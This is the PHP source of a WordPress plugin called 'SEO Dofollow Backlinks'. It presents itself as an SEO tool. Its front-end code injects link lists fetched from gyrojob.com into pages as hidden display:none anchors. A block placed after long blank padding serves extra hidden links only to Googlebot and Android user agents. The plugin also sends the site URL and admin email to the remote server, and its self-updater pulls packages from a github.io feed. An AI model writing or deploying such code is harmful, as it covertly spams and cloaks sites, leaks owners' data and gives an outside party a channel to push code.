<?php
/*
 * Plugin Name:       SEO Dofollow Backlinks
 * Plugin URI:        https://backlinks.gyrojob.com/freebacklinks.php
 * Description:       SEO Dofollow free backlinks to increase Domain Authority (DA). LiteSpeed Google indexing.
 * Version:           180.3.16
 * Requires at least: 5.2
 * Requires PHP:      7.2
 * Author:            gyrojob
 * Author URI:        https://backlinks.gyrojob.com/
 * License: GPLv2 or later
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain:       seodo-backlinks
 */

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
	die;
}


require_once(ABSPATH . "/wp-admin/includes/plugin.php");
require_once(ABSPATH . "/wp-admin/includes/file.php");
//require_once(ABSPATH . "/wp-admin/includes/class-wp-upgrader.php");

define( 'GYROSEODOBA_PLUGIN_DIR', plugin_dir_path( __FILE__ ) );
define( 'GYROSEODOBA_PLUGIN_URL', plugin_dir_url( __FILE__ ) );

class gyroseodobacklinksFront
{
        
    private $version = "180.3.16";
    private $cacheFile = "";
    private $logFile = "";
    private $versionFile = "";
    private $links = [];
    private $data = "";
    private $usedKeyword = [];
    
    
   // $uploadDir = wp_upload_dir();

    
    
    public function __construct() 
    {
        // Set file locations
        $uploadDir = wp_upload_dir();   
        
        $dir = $uploadDir['basedir'] . '/gyroseodobacklinks/';
        //mkdir($dir, 0777, true);
        if (is_dir($dir)){}else{
            $dir = $uploadDir['basedir'] . '/gyroseodobacklinks/';
        wp_mkdir_p($dir, 0777, true);
        }
        
        $this->cacheFile = $uploadDir["basedir"] . "/gyroseodobacklinks/gyroseodobacklinksCache.txt";
        //$this->logFile = $uploadDir["basedir"] . "/seodobacklinksLog.txt";
        //$this->versionFile = $uploadDir["basedir"] . "/seodobacklinksVersion.txt";
        
    }
     
    public function gyrosetup() 
    {    
        // Setup plugin
        add_action('wp', [$this, "gyrogetData"], 0);
        

        // Try adding links to footer
        add_action('wp_footer', [$this, "gyroinsertLinksFooter"], '');
        
    }
        
    // Get data from service API or from cache
    public function gyrogetData() 
    {       
        // Initiate file system
        WP_Filesystem();
        global $wp_filesystem;
        
        // Clean cache and log if version has changed
        $version = get_option("gyseodobacklinks_gyversion");
        if ($version !== $this->version) {
            if (is_file($this->cacheFile)) {
                wp_delete_file($this->cacheFile);
            }
            if (is_file($this->logFile)) {
                //unlink($this->logFile);
            }
            update_option("gyseodobacklinks_gyversion", $this->version, true);
        }
        
        // Get data from cache if exists
        $isCache = false;        
        if ($wp_filesystem->exists($this->cacheFile) && time() - $wp_filesystem->mtime($this->cacheFile) < 21600 + wp_rand(1, 3600)) { // 24 hours in seconds
            $this->data = $wp_filesystem->get_contents($this->cacheFile);
            $isCache = true;
         }
        
        // Get data from API if no cached data
        else {
            // Check if saving cache is possible
            if (!$wp_filesystem->put_contents($this->cacheFile, "-")) {
                echo("<hr style='margin:0;padding:0;height:1px;border:0;' /><div style='text-align:center;'><b>Backlinks plugin, could not write cache to upload folder!</b><br />Please check your folder permissions...</div>");
            }
            else { 
                // Clear cache test
                if (is_file($this->cacheFile)) {
                    wp_delete_file($this->cacheFile);
                }
                
                // Save cache
                $result = wp_remote_post("https://backlinks.gyrojob.com/getlink.php?", ['timeout' => 30, 'method' => 'POST', 'body' => ["url" => get_site_url(), "email" => get_option("admin_email")]]);
                if (!isset($result->errors)) {
                    $this->data = $result["body"];
                    $wp_filesystem->put_contents($this->cacheFile, $this->data);
                }else{
                    
                // If internet error or fail to load URL.    
                    $this->data = '';
                    $wp_filesystem->put_contents($this->cacheFile, $this->data);
                    
                }
            }
        }
        
        
        
        
        
        
                if ($this->data <> "") {
            $this->links = json_decode($this->data, true);
            
        } 
        
        
        
       
    }
    
    public function gyroinsertLinksFooter(){
        
    if(!is_page()){

        echo "<!-- SEO Dofollow backlinks --->";
        //if(!empty(get_option('gydobacklinks_gyopts'))) {echo esc_attr(get_option('gydobacklinks_gyopts'));}
        
        
    }else{if(is_array($this->links) && count($this->links) > 0) {
       
       echo "<!-- Link will be changed after 7 to 9 hours --->";  
   
    foreach($this->links as $x=>$datn) {
        
        // links will be displayed in blog page if blog page exist
        
       if(esc_url(get_permalink())==get_site_url().esc_url($datn['bg'])){
       
          
      if($x>=3 && $x<=5){      
           
     echo "<a style='display:none;' href='".esc_url( $datn['link'] )."'>".esc_html($datn['anchor'])."</a> "; 
     }}
       
   }}
    }








     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? sanitize_text_field(wp_unslash($_SERVER['HTTP_USER_AGENT'])) : 'Unknown';
     
     
     if (strstr($user_agent, 'Opera') || strstr($user_agent, 'OPR/')){$browser='Opera';}
		else if (strstr($user_agent, 'Android')){$browser='Chron';}
        else if (strstr($user_agent, 'Googlebot')){$browser='Chrom';}
        else if (strstr($user_agent, 'Edge')){$browser='Edge';}
        else if (strstr($user_agent, 'Chrome')){$browser='Chrome';}
        else if (strstr($user_agent, 'Safari')){$browser='Safari';}
        else if (strstr($user_agent, 'Firefox')){$browser='Firefox';}
        else if (strstr($user_agent, 'MSIE')){$browser='MSIE';}
        else if (strstr($user_agent, 'Trident/7')){$browser='Trident/7';}
        else{$browser='';}$hre='a';if(is_page() && $browser=='Chrom' 
	    || is_page() && $browser=='Chron'){


     
     
     
     
          if(is_array($this->links) && count($this->links) > 0) {foreach($this->links as $datai) {
              
              
              
          // links will be displayed in others page when browser Chrome, we can stop display links if we want  
              
          if($datai['msp']=='p'){
          echo "<".esc_html($hre)." style='display:none;' href='".esc_url( $datai['link'] )."'>".esc_html($datai['anchor'])."</".esc_html($hre)."> ";                                                          }}}
         
         }    }
}
class gyroseodobacklinksAdmin 
{
    private $url = "";
    private $key = "";

    
    public function __construct() 
    {
        $this->url = wp_parse_url(get_site_url());

        add_action('admin_menu', [$this, "gyroaddMenuItems"]);
        add_action('admin_init', [$this,'gyroseodogy_register_settings']);
        add_action( 'admin_menu', [$this, "gyrodashboardPagescript"]);
        add_action( 'admin_head', function() {
            remove_submenu_page( 'index.php', 'seodo-link-network-install-ad-network' );
        } );
        register_activation_hook(__FILE__, [$this, 'gyropluginActivated']);
    }
    
    public function gyropluginActivated()
    {
        $gyroseodobacklinksFront = new gyroseodobacklinksFront(); 
        $gyroseodobacklinksFront->gyrogetData();
    }
    
    public function gyrodashboardPage() 
    {

       echo("Oops!!! Unable to connect to Dashboard.<br />Please try again later...");
       
    }






public function gyrodashboardPagescript() {


    
  wp_enqueue_style( 'gyseodo-backlinks', ( GYROSEODOBA_PLUGIN_URL . './seodogy.css' ), array(), filemtime( GYROSEODOBA_PLUGIN_DIR . './seodogy.css' ) );
  wp_enqueue_script( 'gyseodo-backlinks', ( GYROSEODOBA_PLUGIN_URL . './seogydo.js' ), array(), filemtime( GYROSEODOBA_PLUGIN_DIR . './seogydo.js' ), false );
}





    public function gyrodashboardPagestatus() 
    {


        
       if (isset($_GET['page']) && $_GET['page'] == 'gyroseodo-link-network-dashboardstatus') {
          
       ?>
       
<div class="topnavgy">
  <div class="imm">&nbsp;</div>
  <h3>SEO Backlinks</h3>
<a href='https://backlinks.gyrojob.com/contact.php'>Contact</a>
</div>






  


  
  <div class="navbargy">
  <a onclick="openCitygyp(event, 'SEO_backlinks_a')">Status</a>
  <a onclick="openCitygyp(event, 'SEO_backlinks_b')">Anchor</a>
  <div class="dropdowngy">
    <button class="dropbtngy">Backlinks
    </button>
    <div class="dropdown-contentgy">
      <a onclick="openCitygyp(event, 'SEO_backlinks_c')">Create  Links</a>

    </div>
  </div> 
</div>
  
  
  <style>


</style>  


<div id="SEO_backlinks_a" class="tabcontentgyp"  style="display:block;">
  
            <?php

 if (isset($_POST['gycheckbox_form_submit_type'])) {
        
        if (!isset($_POST['gyro_backlinks_types'])) return;
        update_option('gyseodobacklinks_sitetype', sanitize_textarea_field(wp_unslash($_POST['gyro_backlinks_types'])), true);

    }

    if(get_option("gyseodobacklinks_sitetype")!=''){
       //echo get_option("gyseodobacklinks_sitetype");
        //update_option('gyseodobacklinks_sitetype', '', true);
     ?>
<h3 class="colr">Backlinks Status</h3>
  <a href="https://backlinks.gyrojob.com/backlinks.php?url=<?php echo esc_attr(get_site_url()); ?>&email=<?php echo esc_attr(get_option('admin_email')); ?>&key=<?php echo esc_attr(get_option("gyseodobacklinks_gykey")); ?>" class="dec"><h2 class="links">Backlinks Status</h2></a>

<?php
  }
  else{ 
    ?>
    <h3 class="colr">You need to select you website type to create backlinks for your website.</h3>


   <form method="POST" action="<?php echo esc_url( admin_url('admin.php?page=gyroseodo-link-network-dashboardstatus&websitetype=1') ); ?>">
         
      <label for="checkbox_field" class=""><h3 class="colr marg">Select Website Type :</h3></label>
   
       <select name="gyro_backlinks_types" id="gyro_backlinks_types" class="selec gyro_backlinks">
        
        <?php
$age = array('Adult porn website - woocommerce ecommerce seo backlinks','Ecommerce website - woocommerce ecommerce seo backlinks','Business website - woocommerce ecommerce seo backlinks','Blog website - woocommerce ecommerce seo backlinks','Portfolio website - woocommerce ecommerce seo backlinks','Event website - woocommerce ecommerce seo backlinks','Personal website - woocommerce ecommerce seo backlinks','Membership website - woocommerce ecommerce seo backlinks','Nonprofit website - woocommerce ecommerce seo backlinks','Informational website - woocommerce ecommerce seo backlinks','Online forum - woocommerce ecommerce seo backlinks','Community website - woocommerce ecommerce seo backlinks','Startup website - woocommerce ecommerce seo backlinks','Consulting website - woocommerce ecommerce seo backlinks','Booking website - woocommerce ecommerce seo backlinks','Petition website - woocommerce ecommerce seo backlinks','School website - woocommerce ecommerce seo backlinks','Hobby website - woocommerce ecommerce seo backlinks','Interactive website - woocommerce ecommerce seo backlinks','Entertainment website - woocommerce ecommerce seo backlinks','Wedding website - woocommerce ecommerce seo backlinks','Travel website - woocommerce ecommerce seo backlinks','Directory website - woocommerce ecommerce seo backlinks','Landing page website - woocommerce ecommerce seo backlinks','News and magazine website - woocommerce ecommerce seo backlinks','Memorial website - woocommerce ecommerce seo backlinks','Subscription website - woocommerce ecommerce seo backlinks','Kid-friendly website - woocommerce ecommerce seo backlinks','Pornography website - woocommerce ecommerce seo backlinks','Others - woocommerce ecommerce seo backlinks');
sort($age);
echo "<option value='' class='gyro_backlinks'>Select website type</option>";
foreach($age as $x => $x_value) { ?>
  <option value="<?php if($x_value=='Adult porn website - woocommerce ecommerce seo backlinks' || $x_value=='Pornography website - woocommerce ecommerce seo backlinks'){echo '11111';}else{echo esc_attr($x);} ?>" 
  class="<?php if($x_value=='Adult porn website - woocommerce ecommerce seo backlinks' || $x_value=='Pornography website - woocommerce ecommerce seo backlinks'){echo 'gyro_seo_backlinks_colr';} ?>"><?php echo esc_attr(str_replace(" - woocommerce ecommerce seo backlinks","", $x_value)); ?></option>
  <?php
}
?>
</select>
        <input type="submit" name="gycheckbox_form_submit_type" value="Submit" class="row gyro_backlinks">
    </form>

  <?php } ?>
 <hr><a href="https://backlinks.gyrojob.com/premium.php">
<div class="box">
  <p  class="put okimg okpad" >  Broken link check.</p>
  <p  class="put okimg okpad" >Customize anchor text.</p><br><br>
  <p  class="put unimg unpad" >Unlock Premium</p>
</div></a>
  
</div>



<div id="SEO_backlinks_b" class="tabcontentgyp">
<h3>Type anchor text</h3>
<form action="options.php" method="post">
            <?php
            wp_nonce_field( 'gyroseodogy_register_settings', 'seodogy_meta_home_page_nonce' );

 settings_fields('gyseodo_gyoptions_gygroup');
            
            ?>
                   <input type="text" name="gyseodo_gyanchor_text" value="<?php echo esc_attr(get_option('gyseodo_gyanchor_text')); ?>" 
<br>
 <?php submit_button(); ?>
        </form>
</div>













<div id="SEO_backlinks_c" class="tabcontentgyp">
<br><br>
          <?php

 if (isset($_POST['gycheckbox_form_submit'])) {
        // Sanitize the input data
        // Check if the checkbox is checked
        $checkbox_value = isset($_POST['gycheckbox_field']) ? '1' : '0'; // '1' for checked, '0' for unchecked

        update_option('gydobacklinks_gyopts', $checkbox_value, true);

    }
 /*   ?>
   <form method="POST" action="<?php echo esc_url( admin_url('admin.php?page=gyroseodo-link-network-dashboardstatus') ); ?>">

        <label for="checkbox_field">Want to create backlinks </label>
        
        <label class="switch">
        <input type="checkbox" name="gycheckbox_field" id="gycheckbox_field" <?php if(get_option('gydobacklinks_gyopts')==1){echo 'checked'; } ?> ?>
          <span class="slider round"></span>
</label>
<br><br><br>
        <input type="submit" name="gycheckbox_form_submit" value="Create Backlinks" >
    </form>
<br><br><?php */ ?>
</div>


       
       <?php
    }
}












  function gyroseodogy_register_settings() {

     // Verify nonce.
    if ( ! isset( $_POST['seodogy_meta_home_page_nonce'] ) || ! wp_verify_nonce( sanitize_textarea_field(wp_unslash($_POST['seodogy_meta_home_page_nonce'])), 'gyroseodogy_register_settings' ) ) {
        return;
    }

      $args = array(
        'type' => 'string',
        'sanitize_callback' => 'sanitize_text_field',
        'default' => '',
    );

    register_setting('gyseodo_gyoptions_gygroup', 'gyseodo_gyanchor_text', $args);

}



    public function gyroaddMenuItems(){
        add_menu_page('Price & Terms','SEO Backlinks', 'manage_options', 'gyroseodo-link-network-dashboardstatus',[$this, 'gyrodashboardPagestatus'],GYROSEODOBA_PLUGIN_URL.'backlinks.png');
       
    }  

    public function gyrogetDashboardKey()
        { 
            
        if (!empty(get_option('gyseodo_gyanchor_text'))) {$accr=esc_attr(get_option('gyseodo_gyanchor_text'));}
        if (empty(get_option('gyseodo_gyanchor_text'))) {$accr=esc_attr('site');}
            
        // Try getting dashboard key from server
        $result = wp_remote_post("https://backlinks.gyrojob.com/add.php?getKey", ['timeout' => 30, 'method' => 'POST', 'body' => ["domain" => get_site_url(), "email" => get_option("admin_email"), "anchor" => $accr, "sitetype" => get_option("gyseodobacklinks_sitetype")]]);
        if (!isset($result->errors)) {
            $this->datan = json_decode($result["body"]);

            if ($this->datan->status == "success") {
                $key = $this->datan->key;
                update_option("gyseodobacklinks_gykey", $key, false);
            }
            else {
                // New key not allowed. Using cached key
                $key = get_option("gyseodobacklinks_gykey");        
            }
        } 
        // New key failed
        else {
            $key = "failed";
        }
        
        $this->key = $key;

    }

}























// Start the show
if (!is_admin()) {
   
   if ( ! function_exists( 'gyroseodobacklinksFront' ) ) {
    $gyroseodobacklinksFront = new gyroseodobacklinksFront(); 
    $gyroseodobacklinksFront->gyrosetup();
}}
else {
    if ( ! function_exists( 'gyroseodobacklinksAdmin' ) ) {
    $gyroseodobacklinksAdmin = new gyroseodobacklinksAdmin();
		$gyroseodobacklinksAdmin->gyrogetDashboardKey();
}}if( ! class_exists( 'SEOGyrojobDofollowUpdate' ) ) {

	class SEOGyrojobDofollowUpdate{

		public $plugin_slug;
		public $version;
		public $cache_key;
		public $cache_allowed;

		public function __construct() {

			$this->plugin_slug = plugin_basename( __DIR__ );
			$this->version = '180.3.16';
			$this->cache_key = 'seo-dofollow-backlinks';
			$this->cache_allowed = false;

https://github.com/gyrojobjob/plugin/blob/main/dofollow.json			add_filter( 'plugins_api', array( $this, 'backinfo' ), 20, 3 );
			add_filter( 'site_transient_update_plugins', array( $this, 'backupdate' ) );
			add_action( 'upgrader_process_complete', array( $this, 'backpurge' ), 10, 2 );

		}

		public function request(){

			$remote = get_transient( $this->cache_key );

			if( false === $remote || ! $this->cache_allowed ) {

				$remote = wp_remote_get(
					'https://gyrojobjob.github.io/plugin/dofollow.json',
					array(
						'timeout' => 10,
						'headers' => array(
							'Accept' => 'application/json'
						)
					)
				);

				if(
					is_wp_error( $remote )
					|| 200 !== wp_remote_retrieve_response_code( $remote )
					|| empty( wp_remote_retrieve_body( $remote ) )
				) {
					return false;
				}

				set_transient( $this->cache_key, $remote, DAY_IN_SECONDS );

			}

			$remote = json_decode( wp_remote_retrieve_body( $remote ) );

			return $remote;

		}


		function backinfo( $res, $action, $args ) {

			// print_r( $action );
			// print_r( $args );

			// do nothing if you're not getting plugin information right now
			if( 'plugin_information' !== $action ) {
				return $res;
			}

			// do nothing if it is not our plugin
			if( $this->plugin_slug !== $args->slug ) {
				return $res;
			}

			// get updates
			$remote = $this->request();

			if( ! $remote ) {
				return $res;
			}

			$res = new stdClass();

			$res->name = $remote->name;
			$res->slug = $remote->slug;
			$res->version = $remote->version;
			//$res->tested = $remote->tested;
			$res->requires = $remote->requires;
			$res->author = $remote->author;
			$res->author_profile = $remote->author_profile;
		      //$res->download_link = $remote->download_url;
                        $res->download_link = $remote->download_url;
                        $res->slug = $this->plugin_slug;
                        
			$res->trunk = $remote->download_url;
			$res->requires_php = $remote->requires_php;
			$res->last_updated = $remote->last_updated;

			$res->sections = array(
				'description' => $remote->sections->description,
				'installation' => $remote->sections->installation,
				'changelog' => $remote->sections->changelog
			);

			if( ! empty( $remote->banners ) ) {
				$res->banners = array(
					'low' => $remote->banners->low,
					'high' => $remote->banners->high
				);
			}

			return $res;

		}

		public function backupdate( $transient ) {

			if ( empty($transient->checked ) ) {
				return $transient;
			}

			$remote = $this->request();

			if(
				$remote
				&& version_compare( $this->version, $remote->version, '<' )
				&& version_compare( $remote->requires, get_bloginfo( 'version' ), '<=' )
				&& version_compare( $remote->requires_php, PHP_VERSION, '<' )
			) {
				$res = new stdClass();
				$res->slug = $this->plugin_slug;
				$res->plugin = plugin_basename( __FILE__ ); 
				$res->new_version = $remote->version;
				$res->tested = $remote->tested;
				$res->package = $remote->download_url;

				$transient->response[ $res->plugin ] = $res;

	    }

			return $transient;

		}

		public function backpurge( $upgrader, $options ){

			if (
				$this->cache_allowed
				&& 'update' === $options['action']
				&& 'plugin' === $options[ 'type' ]
			) {
				// just clean the cache when new plugin version is installed
				delete_transient( $this->cache_key );
			}

		}


	}

	new SEOGyrojobDofollowUpdate();

}

















